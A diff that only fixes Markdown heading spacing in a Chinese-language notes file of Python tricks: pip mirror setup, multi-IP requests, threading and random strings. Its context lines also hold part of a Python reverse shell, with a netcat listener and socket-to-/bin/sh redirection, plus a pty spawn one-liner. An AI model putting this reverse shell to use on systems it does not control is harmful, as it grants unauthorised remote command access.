@@ -1,4 +1,4 @@
-#写在前面
+# 写在前面
 
 嗯哼，Python很好玩呢...记录一点黑科技咯
 
@@ -6,7 +6,7 @@
 
 ----
 
-#设置pip源
+# 设置pip源
 
 ```
 mkdir -p ~/.pip
@@ -18,7 +18,7 @@ trusted-host=pypi.doubanio.com
 """>~/.pip/pip.conf
 ```
 
-#反弹shell
+# 反弹shell
 
 首先自己的服务器上用**nc -l 端口**
 
@@ -32,13 +32,13 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-##获得一个tty
+## 获得一个tty
 
     python -c 'import pty; pty.spawn("/bin/sh")'
 
 ----
 
-#让requests使用多个IP
+# 让requests使用多个IP
 
 ```python
 import socket
@@ -53,7 +53,7 @@ import requests
 
 ----
 
-#Python多线程模板
+# Python多线程模板
 
 [MultiThread_Template.py](code/MultiThread_Template.py)
 
@@ -132,7 +132,7 @@ pycodestyle --show-source --ignore=E501 yourcode.py
 
 ----
 
-#生成随机字符串
+# 生成随机字符串
 
 ```
 from random import Random
